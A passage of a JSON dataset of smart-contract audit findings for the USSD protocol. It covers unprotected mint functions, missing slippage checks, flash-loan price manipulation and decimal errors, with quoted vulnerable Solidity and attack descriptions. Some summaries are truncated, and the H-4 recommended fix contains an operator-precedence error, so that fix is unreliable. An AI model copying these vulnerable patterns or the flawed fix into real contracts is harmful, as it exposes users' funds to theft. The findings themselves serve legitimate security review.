      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/808",
      "tags": [
        "Flash Loan",
        "Overflow/Underflow",
        "Uniswap"
      ],
      "finders": [
        "VAD37",
        "curiousapple",
        "Bahurum",
        "simon135",
        "n33k",
        "0xRan4212",
        "WATCHPUG",
        "mahdikarimi",
        "nobody2018"
      ]
    },
    {
      "id": "19137",
      "title": "H-8: Lack of access control for `mintRebalancer()` and `burnRebalancer()`",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/777 \n\n## Found by \n0x2e, 0xAzez, 0xHati, 0xMojito, 0xPkhatri, 0xRobocop, 0xSmartContract, 0xStalin, 0xeix, 0xyPhilic, 14si2o\\_Flint, AlexCzm, Angry\\_Mustache\\_Man, Aymen0909, Bahurum, Bauchibred, Bauer, BlockChomper, Brenzee, BugBusters, BugHunter101, Delvir0, DevABDee, Dug, Fanz, GimelSec, HonorLt, J4de, JohnnyTime, Juntao, Kodyvim, Kose, Lilyjjo, Madalad, Nyx, PokemonAuditSimulator, RaymondFam, Saeedalipoor01988, SanketKogekar, Schpiel, SensoYard, T1MOH, TheNaubit, Tricko, VAD37, Vagner, WATCHPUG, \\_\\_141345\\_\\_, anthony, ast3ros, auditsea, berlin-101, blackhole, blockdev, carrotsmuggler, chainNue, chalex.eth, cjm00n, coincoin, coryli, ctf\\_sec, curiousapple, dacian, evilakela, georgits, giovannidisiena, immeas, innertia, jah, juancito, kie, kiki\\_dev, lil.eth, m4ttm, mahdikarimi, mrpathfindr, n33k, neumo, ni8mare, nobody2018, pavankv241, pengun, qbs, qckhp, qpzm, ravikiran.web3, saidam017, sam\\_gmk, sashik\\_eth, shaka, shealtielanz, shogoki, simon135, slightscan, smiling\\_heretic, tallo, theOwl, the\\_endless\\_sea, toshii, tsvetanovv, tvdung94, twcctop, twicek, vagrant, ver0759, warRoom, whiteh4t9527, ww4tson, yy\n## Summary\n\nLack of access control in `USSD.mintRebalancer()` and `USSD.burnRebalancer()` can lead to a denial-of-service attack and malfunction of the rebalancer as it can alter `totalSupply`, which is used in `rebalancer.SellUSSDBuyCollateral` to calculate `ownval`.\n\n## Vulnerability Detail\n\nBased on the context, `USSD.mintRebalancer()` should be `onlyBalancer` as it should only be allowed to be called by the rebalancer.\n\nHowever, both `USSD.mintRebalancer()` and `USSD.burnRebalancer()` lack access control in the current implementation.\n\n## Impact\n\nAn attacker can mint an amount of `type(uint256).max - totalSupply()` and cause a denial-of-service attack by preventing anyone else from minting.\n\nAdditionally, minting will also change the `totalSupply` which alters the `collateralFactor` and cause the rebalancer to malfunction, as the `SellUSSDBuyCollateral()` function relies on the `USSD.collateralFactor()`.\n\nThe `totalSupply` is also used in `rebalancer.SellUSSDBuyCollateral` to calculate the `ownval`.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L204-L210\n\n```solidity\nfunction mintRebalancer(uint256 amount) public override {\n    _mint(address(this), amount);\n}\n\nfunction burnRebalancer(uint256 amount) public override {\n    _burn(address(this), amount);\n}\n```\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L92-L107\n\n```solidity\n    function rebalance() override public {\n      uint256 ownval = getOwnValuation();\n      (uint256 USSDamount, uint256 DAIamount) = getSupplyProportion();\n      if (ownval < 1e6 - threshold) {\n        // peg-down recovery\n        BuyUSSDSellCollateral((USSDamount - DAIamount / 1e12)/2);\n      } else if (ownval > 1e6 + threshold) {\n        // mint and buy collateral\n        // never sell too much USSD for DAI so it 'overshoots' (becomes more in quantity than DAI on the pool)\n        // otherwise could be arbitraged through mint/redeem\n        // the execution difference due to fee should be taken into accounting too\n        // take 1% safety margin (estimated as 2 x 0.5% fee)\n        IUSSD(USSD).mintRebalancer(((DAIamount / 1e12 - USSDamount)/2) * 99 / 100); // mint ourselves amount till balance recover\n        SellUSSDBuyCollateral();\n      }\n    }\n```\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L179-L194\n\n```solidity\nfunction collateralFactor() public view override returns (uint256) {\n    uint256 totalAssetsUSD = 0;\n    for (uint256 i = 0; i < collateral.length; i++) {\n        totalAssetsUSD +=\n            (((IERC20Upgradeable(collateral[i].token).balanceOf(\n                address(this)\n            ) * 1e18) /\n                (10 **\n                    IERC20MetadataUpgradeable(collateral[i].token)\n                        .decimals())) *\n                collateral[i].oracle.getPriceUSD()) /\n            1e18;\n    }\n\n    return (totalAssetsUSD * 1e6) / totalSupply();\n}\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n`USSD.mintRebalancer()` should be `onlyBalancer`.",
      "summary": "\nThis bug report is about the lack of access control in the `USSD.mintRebalancer()` and `USSD.burnRebalancer()` functions, which can be found in the USSD smart contract. This vulnerability was discovered by a group of security auditors, including 0x2e, 0xAzez, 0xHati, 0xMojito, 0xPkhatri, 0xRobocop, 0xSmartContract, 0xStalin, 0xeix, 0xyPhilic, 14si2o\\_Flint, AlexCzm, Angry\\_Mustache\\_Man, Aymen0909, Bahurum, Bauchibred, Bauer, BlockChomper, Brenzee, BugBusters, BugHunter101, Delvir0, DevABDee, Dug, Fanz, GimelSec, HonorLt, J4de, JohnnyTime, Juntao, Kodyvim, Kose, Lilyjjo, Madalad, Nyx, PokemonAuditSimulator, RaymondFam, Saeedalipoor01988, SanketKogekar, Schpiel, SensoYard, T1MOH, TheNaubit, Tricko, VAD37, Vagner, WATCHPUG, \\_\\_141345\\_\\_, anthony, ast3ros, auditsea, berlin-101, blackhole, blockdev, carrotsmuggler, chainNue, chalex.eth, cjm00n, coincoin, coryli, ctf\\_sec, curiousapple, dacian, evilakela, georgits, giovannidisiena, immeas, innertia, jah, juancito, kie, kiki\\_dev, lil.eth, m4ttm, mahdikarimi, mrpathfindr, n33k, neumo, ni8mare, nobody2018, pavankv241, pengun, qbs, qckhp, qpzm, ravikiran.web3, saidam017, sam\\_gmk, sashik\\_eth, shaka, shealtielanz, shogoki, simon135, slightscan, smiling\\_heretic, tallo",
      "quality_score": 3,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/777",
      "tags": [
        "Access Control"
      ],
      "finders": [
        "J4de",
        "Dug",
        "0xSmartContract",
        "shaka",
        "nobody2018",
        "qbs",
        "lil.eth",
        "smiling\\_heretic",
        "Delvir0",
        "giovannidisiena",
        "Juntao",
        "0xyPhilic",
        "0xMojito",
        "juancito",
        "slightscan",
        "coryli",
        "the\\_endless\\_sea",
        "coincoin",
        "BugBusters",
        "Angry\\_Mustache\\_Man",
        "0xAzez",
        "ww4tson",
        "twcctop",
        "auditsea",
        "sam\\_gmk",
        "pavankv241",
        "m4ttm",
        "Schpiel",
        "blackhole",
        "Lilyjjo",
        "VAD37",
        "shealtielanz",
        "cjm00n",
        "qckhp",
        "SensoYard",
        "immeas",
        "BugHunter101",
        "BlockChomper",
        "Kose",
        "Kodyvim",
        "anthony",
        "kie",
        "ver0759",
        "chalex.eth",
        "tvdung94",
        "mrpathfindr",
        "\\_\\_141345\\_\\_",
        "AlexCzm",
        "HonorLt",
        "curiousapple",
        "chainNue",
        "innertia",
        "Nyx",
        "blockdev",
        "WATCHPUG",
        "JohnnyTime",
        "vagrant",
        "ctf\\_sec",
        "tallo",
        "saidam017",
        "Vagner",
        "RaymondFam",
        "Aymen0909",
        "0xRobocop",
        "n33k",
        "neumo",
        "GimelSec",
        "ni8mare",
        "warRoom",
        "toshii",
        "0xPkhatri",
        "twicek",
        "carrotsmuggler",
        "T1MOH",
        "Brenzee",
        "georgits",
        "Bahurum",
        "simon135",
        "Tricko",
        "Madalad",
        "theOwl",
        "Bauchibred",
        "PokemonAuditSimulator",
        "berlin-101",
        "ravikiran.web3",
        "Fanz",
        "pengun",
        "shogoki",
        "0x2e",
        "evilakela",
        "sashik\\_eth",
        "TheNaubit",
        "yy",
        "0xStalin",
        "qpzm",
        "dacian",
        "SanketKogekar",
        "0xeix",
        "14si2o\\_Flint",
        "DevABDee",
        "tsvetanovv",
        "0xHati",
        "kiki\\_dev",
        "jah",
        "mahdikarimi",
        "ast3ros",
        "Bauer",
        "whiteh4t9527",
        "Saeedalipoor01988"
      ]
    },
    {
      "id": "19136",
      "title": "H-7: Not using slippage parameter or deadline while swapping on UniswapV3",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/673 \n\n## Found by \n0xPkhatri, 0xRan4212, 0xRobocop, 0xSmartContract, 0xStalin, 0xeix, 0xpinky, 0xyPhilic, Angry\\_Mustache\\_Man, Auditwolf, Bahurum, Bauchibred, Bauer, BlockChomper, Brenzee, BugBusters, BugHunter101, CodeFoxInc, Delvir0, Dug, Fanz, HonorLt, J4de, JohnnyTime, Juntao, Kodyvim, Kose, Lilyjjo, Madalad, MohammedRizwan, Nyx, PokemonAuditSimulator, Proxy, RaymondFam, Saeedalipoor01988, Schpiel, SensoYard, T1MOH, TheNaubit, Tricko, Viktor\\_Cortess, WATCHPUG, \\_\\_141345\\_\\_, anthony, ast3ros, berlin-101, blackhole, blockdev, carrotsmuggler, chaithanya\\_gali, chalex.eth, coincoin, ctf\\_sec, curiousapple, dacian, evilakela, eyexploit, immeas, innertia, jah, jprod15, juancito, kie, kiki\\_dev, kutugu, lil.eth, m4ttm, martin, n33k, ni8mare, nobody2018, peanuts, qbs, qckhp, qpzm, saidam017, sakshamguruji, sam\\_gmk, sashik\\_eth, shaka, shealtielanz, shogoki, simon135, slightscan, tallo, theOwl, toshii, twicek, warRoom\n## Summary\n\nWhile making a swap on UniswapV3 the caller should use the slippage parameter `amountOutMinimum` and `deadline` parameter to avoid losing funds.\n\n## Vulnerability Detail\n\n[`UniV3SwapInput()`](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L227-L240) in `USSD` contract does not use the slippage parameter [`amountOutMinimum`](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L237)  nor [`deadline`](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L235). \n\n`amountOutMinimum` is used to specify the minimum amount of tokens the caller wants to be returned from a swap. Using `amountOutMinimum = 0` tells the swap that the caller will accept a minimum amount of 0 output tokens from the swap, opening up the user to a catastrophic loss of funds via [MEV bot sandwich attacks](https://medium.com/coinmonks/defi-sandwich-attack-explain-776f6f43b2fd). \n\n`deadline` lets the caller specify a deadline parameter that enforces a time limit by which the transaction must be executed. Without a deadline parameter, the transaction may sit in the mempool and be executed at a much later time potentially resulting in a worse price for the user.\n\n## Impact\n\nLoss of funds and not getting the correct amount of tokens in return.\n\n## Code Snippet\n\n- Function [`UniV3SwapInput()`](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L227-L240)\n  - Not using [`amountOutMinimum`](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L237)\n  - Not using [`deadline`](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L235)\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse parameters `amountOutMinimum` and `deadline` correctly to avoid loss of funds.",
      "summary": "\nThis bug report is about the UniswapV3 protocol, which is a decentralized exchange for swapping tokens. A group of bug hunters identified an issue with the protocol where it was not using the slippage parameter `amountOutMinimum` or the deadline parameter while swapping on UniswapV3. This issue was found in the `UniV3SwapInput()` function in the `USSD` contract.\n\nUsing the slippage parameter `amountOutMinimum` with a value of 0 opens up the user to a catastrophic loss of funds via a MEV bot sandwich attack. The deadline parameter lets the caller specify a time limit by which the transaction must be executed. Without a deadline parameter, the transaction may sit in the mempool and be executed at a much later time potentially resulting in a worse price for the user.\n\nThe impact of this issue is the potential loss of funds, as well as not getting the correct amount of tokens in return. The bug hunters used manual review as their tool to identify the issue.\n\nThe recommendation is to use parameters `amountOutMinimum` and `deadline` correctly to avoid loss of funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/673",
      "tags": [
        "Uniswap"
      ],
      "finders": [
        "J4de",
        "Dug",
        "0xSmartContract",
        "shaka",
        "nobody2018",
        "qbs",
        "lil.eth",
        "Delvir0",
        "Juntao",
        "0xyPhilic",
        "juancito",
        "slightscan",
        "coincoin",
        "MohammedRizwan",
        "BugBusters",
        "Angry\\_Mustache\\_Man",
        "sam\\_gmk",
        "m4ttm",
        "Schpiel",
        "blackhole",
        "Lilyjjo",
        "shealtielanz",
        "qckhp",
        "SensoYard",
        "immeas",
        "Viktor\\_Cortess",
        "BugHunter101",
        "BlockChomper",
        "Kose",
        "Kodyvim",
        "anthony",
        "kie",
        "0xpinky",
        "chalex.eth",
        "kutugu",
        "\\_\\_141345\\_\\_",
        "HonorLt",
        "curiousapple",
        "innertia",
        "Nyx",
        "blockdev",
        "WATCHPUG",
        "peanuts",
        "JohnnyTime",
        "ctf\\_sec",
        "tallo",
        "eyexploit",
        "saidam017",
        "Auditwolf",
        "RaymondFam",
        "0xRobocop",
        "sakshamguruji",
        "martin",
        "n33k",
        "ni8mare",
        "warRoom",
        "toshii",
        "0xPkhatri",
        "twicek",
        "carrotsmuggler",
        "T1MOH",
        "Brenzee",
        "Bahurum",
        "simon135",
        "Tricko",
        "Madalad",
        "theOwl",
        "Bauchibred",
        "PokemonAuditSimulator",
        "Proxy",
        "berlin-101",
        "Fanz",
        "shogoki",
        "chaithanya\\_gali",
        "evilakela",
        "sashik\\_eth",
        "TheNaubit",
        "0xStalin",
        "jprod15",
        "qpzm",
        "dacian",
        "0xRan4212",
        "0xeix",
        "kiki\\_dev",
        "jah",
        "ast3ros",
        "Bauer",
        "CodeFoxInc",
        "Saeedalipoor01988"
      ]
    },
    {
      "id": "19135",
      "title": "H-6: Wrong computation of the amountToSellUnit variable",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/535 \n\n## Found by \n0xRobocop, 0xlmanini, Aymen0909, Bahurum, Bauer, Juntao, Nyx, Proxy, VAD37, Vagner, WATCHPUG, \\_\\_141345\\_\\_, auditsea, carrotsmuggler, immeas, innertia, kiki\\_dev, pengun, qpzm, saidam017, sakshamguruji, toshii, tvdung94\n## Summary\n\nThe variable `amountToSellUnits` is computed wrongly in the code which will lead to an incorrect amount of collateral to be sold.\n\n## Vulnerability Detail\n\nThe `BuyUSSDSellCollateral()` function is used to sell collateral during a peg-down recovery event. The computation of the amount to sell is computed using the following formula:\n\n```solidity\n// @audit-issue Wrong computation\nuint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n```\n\nThe idea is to sell an amount which is equivalent (in USD) to the ratio of `amountToBuyLeftUSD / collateralval`. Flattening the equation it ends up as:\n\n```solidity\nuint256 amountToSellUnits = (collateralBalance * amountToBuyLeftUSD * 1e18) / (collateralval * 1e18 * 1e18);\n\n// Reducing the equation\nuint256 amountToSellUnits = (collateralBalance * amountToBuyLeftUSD) / (collateralval * 1e18);\n```\n\n`amountToBuyLeftUSD` and `collateralval` already have 18 decimals so their decimals get cancelled together which will lead the last 1e18 factor as not necessary.\n\n## Impact\n\nThe contract will sell an incorrect amount of collateral during a peg-down recovery event.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/6d7a9fdfb1f1ed838632c25b6e1b01748d0bafda/ussd-contracts/contracts/USSDRebalancer.sol#L121\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nDelete the last 1e18 factor",
      "summary": "\nThis bug report is about the incorrect computation of the `amountToSellUnits` variable in the `BuyUSSDSellCollateral()` function in the `USSDRebalancer.sol` contract. The `amountToSellUnits` variable is used to sell an amount of collateral during a peg-down recovery event which should be equivalent (in USD) to the ratio of `amountToBuyLeftUSD / collateralval`. However, the code is written incorrectly which will lead to an incorrect amount of collateral to be sold. The incorrect code is found at line 121 of the `USSDRebalancer.sol` contract. The bug was found by 0xRobocop, 0xlmanini, Aymen0909, Bahurum, Bauer, Juntao, Nyx, Proxy, VAD37, Vagner, WATCHPUG, \\_\\_141345\\_\\_, auditsea, carrotsmuggler, immeas, innertia, kiki\\_dev, pengun, qpzm, saidam017, sakshamguruji, toshii, and tvdung94. The recommendation is to delete the last 1e18 factor.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/535",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "qpzm",
        "innertia",
        "toshii",
        "Nyx",
        "WATCHPUG",
        "kiki\\_dev",
        "carrotsmuggler",
        "Juntao",
        "saidam017",
        "Vagner",
        "auditsea",
        "VAD37",
        "Bauer",
        "Bahurum",
        "immeas",
        "Aymen0909",
        "0xRobocop",
        "tvdung94",
        "sakshamguruji",
        "Proxy",
        "0xlmanini",
        "pengun",
        "\\_\\_141345\\_\\_"
      ]
    },
    {
      "id": "19134",
      "title": "H-5: Price calculation susceptible to flashloan exploits",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/451 \n\n## Found by \n0xHati, Bauchibred, Bauer, BugBusters, Fanz, JohnnyTime, Kodyvim, Schpiel, SensoYard, VAD37, WATCHPUG, \\_\\_141345\\_\\_, blockdev, carrotsmuggler, chalex.eth, coincoin, immeas, juancito, kiki\\_dev, n33k, ni8mare, nobody2018, peanuts, qbs, qckhp, shaka, shogoki, simon135, smiling\\_heretic, tallo, theOwl, tsvetanovv\n## Summary\n\nContract uses uniswap `slot0` price instead of TWAP price. `slot0` price can be manipulated with flash loans.\n\n## Vulnerability Detail\n\nThe contract uses the uniswap DAI-USSD pool to get the price of USSD. It however uses the instantaneous price from `slot0` instead of the TWAP price. The `slot0` price is calculated from the ratios of the assets. This ratio can however be manipulated by buying/selling assets in the pool.\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L71-L80\n\nThus any user can take a flashloan, use those funds to manipulate the price of USSD, and then trigger a rebalance. The attacks can be made profitable by providing just-in-time liquidity to the various pools that `reabalance` interacts with, draining the contract of collateral through arbitrage.\n\n## Impact\n\nPrice can be manipulated and `rebalance` can be called any time. Susceptible to flash loan exploits.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L71-L80\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse TWAP price instead of `slot0` price. [Here](https://github.com/charmfinance/alpha-vaults-contracts/blob/07db2b213315eea8182427be4ea51219003b8c1a/contracts/AlphaStrategy.sol#L136-L144) is an example implementation of TWAP.",
      "summary": "\nThis bug report is about a vulnerability that was found in a contract using Uniswap DAI-USSD pool to get the price of USSD. The contract uses the instantaneous price from `slot0` instead of the TWAP price, which can be manipulated by buying/selling assets in the pool. This manipulation can be done through a flash loan, and can be made profitable by providing just-in-time liquidity to the pools that the contract interacts with. The impact of this vulnerability is that the price can be manipulated and the contract can be called any time, making it susceptible to flash loan exploits. The recommended solution is to use TWAP price instead of `slot0` price. An example implementation of TWAP has been provided.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/451",
      "tags": [],
      "finders": [
        "ni8mare",
        "blockdev",
        "WATCHPUG",
        "tsvetanovv",
        "0xHati",
        "shaka",
        "kiki\\_dev",
        "nobody2018",
        "peanuts",
        "JohnnyTime",
        "qbs",
        "smiling\\_heretic",
        "carrotsmuggler",
        "juancito",
        "tallo",
        "coincoin",
        "BugBusters",
        "Schpiel",
        "VAD37",
        "Bauer",
        "qckhp",
        "SensoYard",
        "simon135",
        "immeas",
        "Kodyvim",
        "chalex.eth",
        "theOwl",
        "Bauchibred",
        "n33k",
        "Fanz",
        "shogoki",
        "\\_\\_141345\\_\\_"
      ]
    },
    {
      "id": "19133",
      "title": "H-4: The price from `StableOracleDAI` is returned with the incorrect number of decimals",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/236 \n\n## Found by \n0xStalin, 0xeix, 0xlmanini, Bahurum, Brenzee, Dug, G-Security, PNS, Proxy, SanketKogekar, T1MOH, Vagner, WATCHPUG, ast3ros, ctf\\_sec, immeas, juancito, kutugu, n33k, peanuts, pengun, qbs, qpzm, saidam017, sam\\_gmk, sashik\\_eth, twicek\n## Summary\n\nThe price returned from the `getPriceUSD` function of the `StableOracleDAI` is scaled up by `1e10`, which results in 28 decimals instead of the intended 18.\n\n## Vulnerability Detail\n\nIn `StableOracleDAI` the `getPriceUSD` function is defined as follows...\n\n```solidity\n    function getPriceUSD() external view override returns (uint256) {\n        address[] memory pools = new address[](1);\n        pools[0] = 0x60594a405d53811d3BC4766596EFD80fd545A270;\n        uint256 DAIWethPrice = DAIEthOracle.quoteSpecificPoolsWithTimePeriod(\n            1000000000000000000, // 1 Eth\n            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH (base token)\n            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI (quote token)\n            pools, // DAI/WETH pool uni v3\n            600 // period\n        );\n\n        uint256 wethPriceUSD = ethOracle.getPriceUSD();\n\n        // chainlink price data is 8 decimals for WETH/USD, so multiply by 10 decimals to get 18 decimal fractional\n        //(uint80 roundID, int256 price, uint256 startedAt, uint256 timeStamp, uint80 answeredInRound) = priceFeedDAIETH.latestRoundData();\n        (, int256 price,,,) = priceFeedDAIETH.latestRoundData();\n\n        return (wethPriceUSD * 1e18) / ((DAIWethPrice + uint256(price) * 1e10) / 2);\n    }\n```\n\nThe assumption is made that the `DAIWethPrice` is 8 decimals, and is therefore multiplied by `1e10` in the return statement to scale it up to 18 decimals. \n\nThe _other_ price feeds used in the protocol are indeed received with decimals, however, the Chainlink DAI/ETH price feed returns a value with 18 decimals as can be seen on their site.\n\nhttps://docs.chain.link/data-feeds/price-feeds/addresses\n\n## Impact\n\nThis means that the price returned from the `getPriceUSD` function is scaled up by `1e10`, which results in 28 decimals instead of the intended 18, drastically overvaluing the DAI/USD price.\n\nThis will result in the USSD token price being a tiny fraction of what it is intended to be. Instead of being pegged to $1, it will be pegged to $0.0000000001, completely defeating the purpose of the protocol.\n\nFor example, if a user calls `USSD.mintForToken`, supplying DAI, they'll be able to mint `1e10` times more USSD than intended.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleDAI.sol#L33-L53\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRemove the `* 1e10` from the return statement.\n\n```diff\n-   return (wethPriceUSD * 1e18) / ((DAIWethPrice + uint256(price) * 1e10) / 2);\n+   return (wethPriceUSD * 1e18) / (DAIWethPrice + uint256(price) / 2);\n```",
      "summary": "\nA bug has been found in the `StableOracleDAI` contract of the 2023-05-USSD protocol. It was identified by a group of auditors including 0xStalin, 0xeix, 0xlmanini, Bahurum, Brenzee, Dug, G-Security, PNS, Proxy, SanketKogekar, T1MOH, Vagner, WATCHPUG, ast3ros, ctf\\_sec, immeas, juancito, kutugu, n33k, peanuts, pengun, qbs, qpzm, saidam017, sam\\_gmk, sashik\\_eth, and twicek.\n\nThe `getPriceUSD` function of the `StableOracleDAI` is designed to return the price of DAI in USD. The function assumes that the `DAIWethPrice` is 8 decimals and multiplies it by `1e10` to scale it up to 18 decimals. However, the Chainlink DAI/ETH price feed returns a value with 18 decimals as can be seen on their site. This means that the price returned from the `getPriceUSD` function is scaled up by `1e10`, which results in 28 decimals instead of the intended 18, drastically overvaluing the DAI/USD price.\n\nThis will result in the USSD token price being a tiny fraction of what it is intended to be. Instead of being pegged to $1, it will be pegged to $0.0000000001, completely defeating the purpose of the protocol. For example, if a user calls `USSD.mintForToken`, supplying DAI, they'll be able to mint `1e10` times more USSD than intended.\n\nThe code snippet for the `getPriceUSD` function can be found at https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleDAI.sol#L33-L53.\n\nThe recommendation to fix this issue is to remove the `* 1e10` from the return statement.\n\n```diff\n-   return (wethPriceUSD * 1e18) / ((DAIWethPrice + uint256(",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/236",
      "tags": [
        "Decimals"
      ],
      "finders": [
        "0xStalin",
        "qpzm",
        "Dug",
        "twicek",
        "SanketKogekar",
        "0xeix",
        "WATCHPUG",
        "qbs",
        "peanuts",
        "ctf\\_sec",
        "juancito",
        "T1MOH",
        "saidam017",
        "Vagner",
        "Brenzee",
        "PNS",
        "sam\\_gmk",
        "ast3ros",
        "Bahurum",
        "immeas",
        "G-Security",
        "Proxy",
        "kutugu",
        "n33k",
        "0xlmanini",
        "pengun",
        "sashik\\_eth"
      ]
    },
    {
      "id": "19132",
      "title": "H-3: The getOwnValuation() function contains errors in the price calculation",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/222 \n\n## Found by \n0xPkhatri, 0xpinky, AlexCzm, Bauer, J4de, carrotsmuggler, kiki\\_dev, peanuts, sam\\_gmk, sashik\\_eth, simon135, theOwl, twicek, warRoom\n## Summary\nThe getOwnValuation() function in the provided code has incorrect price calculation logic when token0() or token1() is equal to USSD. The error leads to inaccurate price calculations.\n\n## Vulnerability Detail\nThe `USSDRebalancer.getOwnValuation()` function calculates the price based on the sqrtPriceX96 value obtained from the uniPool.slot0() function. The calculation depends on whether token0() is equal to USSD or not.\nIf token0() is equal to USSD, the price calculation is performed as follows:\n```solidity\n  price = uint(sqrtPriceX96)*(uint(sqrtPriceX96))/(1e6) >> (96 * 2);\n```\nHowever,there is an error in the price calculation logic. The calculation should be:\n```solidity\nprice = uint(sqrtPriceX96) * uint(sqrtPriceX96) * 1e6 >> (96 * 2);\n\n```\nIf token0() is not equal to USSD, the price calculation is slightly different:\n```solidity\n price = uint(sqrtPriceX96)*(uint(sqrtPriceX96))*(1e18 /* 1e12 + 1e6 decimal representation */) >> (96 * 2);\n        // flip the fraction\n        price = (1e24 / price) / 1e12;\n```\nThe calculation should be:\n```solidity\n price = uint(sqrtPriceX96)*(uint(sqrtPriceX96))*(1e6 /* 1e12 + 1e6 decimal representation */) >> (96 * 2);\n        // flip the fraction\n        price = (1e24 / price) / 1e12;\n```\nReference link:\nhttps://blog.uniswap.org/uniswap-v3-math-primer\n\n## Impact\nThe incorrect price calculation in the getOwnValuation() function can lead to significant impact on the valuation of assets in the UniSwap V3 pool. The inaccurate prices can result in incorrect asset valuations, which may affect trading decisions, liquidity provision, and overall financial calculations based on the UniSwap V3 pool.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L74\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L76\n## Tool used\n\nManual Review\n\n## Recommendation\nWhen token0() is USSD, the correct calculation should be uint(sqrtPriceX96) * uint(sqrtPriceX96) * 1e6 >> (96 * 2).\nWhen token1() is USSD, the correct calculation should be \n```solidity \nprice = uint(sqrtPriceX96)*(uint(sqrtPriceX96))*(1e6 /* 1e12 + 1e6 decimal representation */) >> (96 * 2);\n        // flip the fraction\n        price = (1e24 / price) / 1e12;\n```",
      "summary": "\nA bug report has been found on the getOwnValuation() function in the provided code of the UniSwap V3 pool. The bug leads to inaccurate price calculations when token0() or token1() is equal to USSD. This error can have a significant impact on the valuation of assets in the pool, leading to incorrect asset valuations and affecting trading decisions, liquidity provision, and overall financial calculations. The incorrect calculations are present in the code snippets given in the report, and manual review was used to find the bug. The recommendation is to replace the incorrect calculations with the correct ones when token0() or token1() is USSD.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/222",
      "tags": [],
      "finders": [
        "carrotsmuggler",
        "Bauer",
        "J4de",
        "simon135",
        "warRoom",
        "sam\\_gmk",
        "0xPkhatri",
        "twicek",
        "0xpinky",
        "kiki\\_dev",
        "peanuts",
        "sashik\\_eth",
        "theOwl",
        "AlexCzm"
      ]
    },
    {
      "id": "19131",
      "title": "H-2: `USSDRebalancer.sol#SellUSSDBuyCollateral` the check of whether collateral is DAI is wrong",
      "impact": "HIGH",
